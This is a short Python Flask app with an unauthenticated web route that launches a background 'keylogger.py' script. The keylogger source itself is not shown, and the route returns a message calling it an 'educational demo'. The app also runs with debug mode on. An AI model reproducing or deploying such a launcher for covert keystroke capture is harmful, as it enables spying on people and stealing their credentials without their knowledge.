from flask import Flask, render_template
import subprocess

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/start_keylogger")
def start_keylogger():
    try:
        # Start the keylogger in the background
        subprocess.Popen(["python3", "keylogger.py"])
        return "Keylogger started (educational demo only)."
    except Exception as e:
        return f"Failed to start keylogger: {str(e)}"

if __name__ == "__main__":
    app.run(debug=True)
